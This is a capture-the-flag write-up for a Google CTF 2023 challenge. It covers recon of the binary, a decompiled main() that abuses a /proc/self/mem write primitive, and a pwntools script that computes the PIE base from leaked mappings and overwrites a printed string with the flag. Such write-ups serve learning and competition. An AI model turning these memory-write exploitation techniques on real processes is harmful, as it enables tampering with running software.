## Recon  
First use `pwninit` to patch the binary with local libc (the supplied
`libc.so.6` wasn't enough, I had to copy `ld-linux-x86-64.so.2` from a local
backup of `GLIBC_2.34`, which is pretty standard for CTFs these days).  
```bash  
ldd chal  
	linux-vdso.so.1 (0x00007fff98fb4000)  
	libc.so.6 => ./libc.so.6 (0x00007f1de5200000)  
	/lib64/ld-linux-x86-64.so.2 (0x00007f1de557b000)  
```

`file` shows the binary isn't stripped, which will make [[#Static Analysis]]
easier.  
```bash  
file chal  
chal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically
linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3.2.0,
BuildID[sha1]=325b22ba12d76ae327d8eb123e929cece1743e1e, not stripped  
```

Check binary protections with `checksec`.  
```bash  
checksec --file chal  
[*] '/home/crystal/Desktop/chall/chal'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
   RUNPATH:  b'.'  
```

So, we don't need to worry about canaries, but we can't execute shellcode on
the stack. Furthermore, PIE is enabled, so addresses won't be fixed.

Running the binary prints `flag.txt not found`.

After creating flag.txt, the binary exits immediately, with no output.

We could use `ltrace` to get a better understanding of what's happening.  
```bash  
ltrace /home/crystal/Desktop/chall/chal

OK, so the program..  
- reads 4096 bytes from `/proc/self/maps` into file descriptor (`fd`) 3  
- reads the flag into `fd` 3  
- tries to duplicate `fd` 1 to 1337  
- opens `/dev/null` as `fd` 3  
- tries to duplicate `fd` 3 to 0 (`stdin`)  
- tries to duplicate `fd` 3 to (`stdout`)  
- tries to duplicate `fd` 3 to 2 (`stderr`)  
- 3 x `dprintf` calls (print format string), but use an invalid `fd` of -1

`dprintf` is similar to `printf`, but it allows you to specify a `file
descriptor` as the output stream. It writes the formatted output to the
specified file descriptor instead of the standard output.

I guess it's time to take a look at the code! Let's open it in `ghidra` ?

## Static Analysis  
I pasted the `main()` function into chatGPT and asked it to rename variables
and make it more readable, here's what it gave me.  
```c  
int main(void)  
{  
   int maps_fd;  
   char maps[0x1000];  // Buffer to store the contents of /proc/self/maps  
   int flag_fd;  
   char flag[0x80];    // Buffer to store the contents of flag.txt  
   ssize_t num_bytes;  
   int output_fd;  
   int null_fd;  
   int dup_result;  
   int mem_fd;  
   off64_t address;  
   uint length;  
   int scanf_result;  
  
   // Open and read the contents of /proc/self/maps  
   maps_fd = open("/proc/self/maps", 0);  
   num_bytes = read(maps_fd, maps, 4096);  
   close(maps_fd);  
  
   // Open and read the contents of flag.txt  
   flag_fd = open("./flag.txt", 0);  
   if (flag_fd == -1) {  
       puts("flag.txt not found");  
   } else {  
       num_bytes = read(flag_fd, flag, 128);  
       if (num_bytes > 0) {  
           close(flag_fd);  
  
           // Duplicate file descriptor 1 (stdout) to 0x539  
           dup_result = dup2(1, 1337);  
  
           // Open /dev/null for writing  
           null_fd = open("/dev/null", 2);  
  
           // Redirect stdin (0), stdout (1), and stderr (2) to /dev/null  
           dup2(null_fd, 0);  
           dup2(null_fd, 1);  
           dup2(null_fd, 2);  
           close(null_fd);  
  
           // Set an alarm for 60 seconds  
           alarm(60);  
  
           // Write some introductory text and the contents of /proc/self/maps to the output  
           dprintf(dup_result, "This challenge is not a classical pwn\n"  
                   "In order to solve it will take skills of your own\n"  
                   "An excellent primitive you get for free\n"  
                   "Choose an address and I will write what I see\n"  
                   "But the author is cursed or perhaps it's just out of spite\n"  
                   "For the flag that you seek is the thing you will write\n"  
                   "ASLR isn't the challenge so I'll tell you what\n"  
                   "I'll give you my mappings so that you'll have a shot.\n");  
           dprintf(dup_result, "%s\n\n", maps);  
  
           while (1) {  
               // Prompt the user for an address and length  
               dprintf(dup_result, "Give me an address and a length just so:\n"  
                       "<address> <length>\n"  
                       "And I'll write it wherever you want it to go.\n"  
                       "If an exit is all that you desire\n"  
                       "Send me nothing and I will happily expire\n");  
  
               // Read the user's input  
               scanf_result = scanf("%llx %u", &address, &length);  
  
               // Check if the input was successfully parsed  
               if (scanf_result != 2 || length > 128) {  
                   break;  
               }  
  
               // Open /proc/self/mem for writing  
               mem_fd = open("/proc/self/mem", 2);  
               // Set the file position to the specified address  
               lseek64(mem_fd, address, 0);  
               // Write the contents of flag to the specified address  
               write(mem_fd, flag, length);  
               // Close /proc/self/mem  
               close(mem_fd);  
           }  
           // Exit the program  
           exit(0);  
       }  
       puts("flag.txt empty");  
   }  
   return 1;  
}  
```

We quickly realise the program *should* print some output. When connecting to
the remote server, it does so as intended. A teammate later informed me of a
fix for this `ulimit -n 1338` will increase the maximum number of open file
descriptors for the current shell session to 1338 (remember, the program sets
the output to `fd` 1337).

Anyway, the while loop at the bottom is interesting. It takes a user-supplied
`address` and `length`, then reads the flag to that address.

What address might we choose to write the flag to? How about the string that
is printed at the beginning of each loop?

```c  
               s_Give_me_an_address_and_a_lengt  XREF[2]: main:00101357(*),   
                                                          main:0010135e(*)    
001021e0 47 69      ds      "Give me an address and a length  
       76 65   
       20 6d   
```

It's in the `.data` section of the binary, at an offset of `0x21e0`.

The program has PIE enabled, so each time it's run, the binary will have a new
base address.

We need to find the base, then add the offset. Luckily, running the program
against the remote server will print out the memory mappings, e.g.  
```bash  
I'll give you my mappings so that you'll have a shot.

Therefore, we'll write a script to parse this response and calculate the
correct address. We'll send that address when requested and the next time the
loop executes, it will print the newly written data (?).

## Solve Script  
```python  
from pwn import *

io = remote('wfw1.2023.ctfcompetition.com',1337)  
context.log_level='info'

# Offset to the string in .data section, which is printed in while loop  
data_string_offset = 0x21e0

# Find the piebase  
maps = io.recvuntil(b'/home/user/chal')  
maps = maps.split(b'/home/user/chal')[0].split(b'\n')[-1]  
piebase = int(maps[:12], 16)  
pieend = int(maps[13:-48], 16)

info("Pie base: %#x", piebase)  
info("Pie end: %#x", pieend)  
io.recvuntil(b'expire\n')

# Send address of label in .data, it will be overwritten with flag  
# Then on the next iteration of the loop, it will print  
io.sendline(hex(piebase + data_string_offset).encode() + b' 127')

# Flag plz  
warning(io.recv().decode())  
```

We run the script and get the flag.  
```json  
CTF{Y0ur_j0urn3y_is_0n1y_ju5t_b39innin9}  
```
